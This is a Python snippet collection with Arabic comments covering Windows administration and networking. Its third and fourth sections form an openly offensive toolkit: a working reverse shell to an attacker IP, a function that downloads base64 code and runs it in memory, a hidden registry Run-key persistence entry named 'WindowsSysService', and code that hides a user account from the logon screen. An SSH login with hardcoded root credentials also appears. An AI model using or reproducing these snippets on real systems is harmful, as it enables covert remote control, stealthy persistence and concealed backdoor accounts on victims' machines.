# ====================================================================
# 1. إدارة النظام، الطاقة، والعمليات (System & Processes)
# ====================================================================
import os
import ctypes
import subprocess
import psutil

# التحكم بالطاقة
os.system("shutdown /s /t 0") # إطفاء
os.system("shutdown /r /t 0") # إعادة تشغيل
ctypes.windll.user32.LockWorkStation() # قفل الشاشة

# إدارة العمليات
subprocess.Popen("calc.exe") # فتح برنامج
os.system("taskkill /f /im notepad.exe") # إغلاق برنامج بالقوة
cpu_usage = psutil.cpu_percent(interval=1) # استهلاك المعالج
ram_usage = psutil.virtual_memory().percent # استهلاك الرام

# ====================================================================
# 2. استكشاف الشبكة والتحكم عن بعد (Networking & SSH)
# ====================================================================
import socket
import paramiko
import requests

# معلومات الـ IP
local_ip = socket.gethostbyname(socket.gethostname())
public_ip = requests.get('https://api.ipify.org').text

# فحص المنافذ البسيط
def check_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

# الاتصال عن بعد وتخطي الحماية (SSH)
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.1.50', username='root', password='password123')
stdin, stdout, stderr = ssh.exec_command('ls -la')

# ====================================================================
# 3. التشغيل المباشر من الذاكرة والاتصال العكسي (Fileless Execution)
# ====================================================================
import urllib.request
import zipfile
import io
import base64

# الاتصال العكسي المخفي (Reverse Shell)
def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    subprocess.call(["cmd.exe", "/i"])

# جلب كود مشفر (Base64) وتنفيذه في الذاكرة
def exec_base64_payload(url):
    encoded_payload = requests.get(url).text
    exec(base64.b64decode(encoded_payload).decode('utf-8'))

# زرع اتصال دائم بصمت (Persistence)
def add_to_startup_hidden(script_path):
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsSysService", 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
    winreg.CloseKey(key)

# ====================================================================
# 4. التحكم المتقدم في الريجستري والمهام (Advanced Admin)
# ====================================================================
# إخفاء مستخدم من شاشة الدخول
def hide_user_from_logon(username):
    import winreg
    path = rf"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
    winreg.SetValueEx(key, username, 0, winreg.REG_DWORD, 0)
    winreg.CloseKey(key)

# إنشاء مهمة مجدولة
# subprocess.run(['schtasks', '/create', '/tn', 'MyPythonBackup', '/tr', r'"C:\path\to\script.exe"', '/sc', 'daily', '/st', '10:00'])